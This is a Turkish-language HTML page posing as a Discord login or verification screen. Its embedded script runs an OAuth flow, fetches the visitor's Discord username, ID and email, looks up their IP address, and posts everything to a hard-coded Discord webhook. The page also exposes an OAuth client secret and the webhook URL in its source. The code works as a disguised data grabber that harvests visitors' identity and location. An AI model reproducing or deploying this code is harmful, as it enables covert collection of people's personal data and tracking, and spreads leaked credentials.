<!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Discord Giriş</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      max-width: 500px;
      margin: 0 auto;
      padding: 20px;
      text-align: center;
    }
    button {
      background-color: #5865F2;
      color: white;
      border: none;
      padding: 10px 20px;
      border-radius: 4px;
      font-size: 16px;
      cursor: pointer;
      transition: background-color 0.3s;
    }
    button:hover {
      background-color: #4752C4;
    }
  </style>
</head>
<body>
  <h2>Discord ile Giriş</h2>
  <a id="loginBtn">
    <button>Discord ile Giriş Yap</button>
  </a>

  <script>
    const clientId = "1399152888214851595";
    const redirectUri = "https://verify-system.netlify.app/";
    const webhookUrl = "https://discord.com/api/webhooks/1399151324309881015/01oC6NPk2n7Mut17QfUvwsBUFRakn7rBYg52yTP7zI4IEfzEeMKePKD33IwgFvobyQGu";

    const params = new URLSearchParams(window.location.search);
    const code = params.get("code");

    // Login butonuna tıklandığında Discord OAuth'a yönlendir
    document.getElementById("loginBtn").href =
      `https://discord.com/oauth2/authorize?client_id=${clientId}&redirect_uri=${encodeURIComponent(redirectUri)}&response_type=code&scope=identify%20email`;

    // IP adresini almak için fonksiyon
    async function getIP() {
      try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        return data.ip;
      } catch (error) {
        console.error("IP alınırken hata:", error);
        return "Erişilemedi";
      }
    }

    // Kod geldiyse token al ve webhooka gönder
    if (code) {
      (async () => {
        try {
          // IP adresini al
          const ipAddress = await getIP();
          
          // Token al
          const tokenResponse = await fetch("https://discord.com/api/oauth2/token", {
            method: "POST",
            headers: {
              "Content-Type": "application/x-www-form-urlencoded",
            },
            body: new URLSearchParams({
              client_id: clientId,
              client_secret: "XwMSoMkHCF0_D9fnTQy7JlfX7mVOpwP4",
              grant_type: "authorization_code",
              code: code,
              redirect_uri: redirectUri,
              scope: "identify email",
            }),
          });
          
          const tokenData = await tokenResponse.json();
          
          // Kullanıcı bilgilerini al
          const userResponse = await fetch("https://discord.com/api/users/@me", {
            headers: {
              Authorization: `Bearer ${tokenData.access_token}`,
            },
          });
          
          const userData = await userResponse.json();
          
          // Avatar URL'sini oluştur
          const avatarUrl = userData.avatar 
            ? `https://cdn.discordapp.com/avatars/${userData.id}/${userData.avatar}.png?size=256`
            : null;
          
          // Webhook embed verisi
          const embed = {
            title: "Yeni Discord Girişi",
            color: 0x5865F2,
            thumbnail: avatarUrl ? { url: avatarUrl } : undefined,
            fields: [
              {
                name: "Kullanıcı Bilgileri",
                value: `**İsim:** ${userData.username}#${userData.discriminator}\n**ID:** ${userData.id}\n**Email:** ${userData.email || "Erişilemedi"}`,
                inline: false
              },
              {
                name: "IP Adresi",
                value: ipAddress,
                inline: false
              }
            ],
            timestamp: new Date().toISOString(),
            footer: {
              text: "Discord Giriş Sistemi"
            }
          };
          
          // Webhook'a gönder
          await fetch(webhookUrl, {
            method: "POST",
            headers: {
              "Content-Type": "application/json",
            },
            body: JSON.stringify({
              embeds: [embed]
            }),
          });
          
          // Kullanıcıyı bilgilendir
          alert("Giriş başarılı! Bilgileriniz kaydedildi.");
          
        } catch (err) {
          console.error("Hata oluştu:", err);
          alert("Giriş sırasında bir hata oluştu. Lütfen tekrar deneyin.");
        }
      })();
    }
  </script>
</body>
</html>
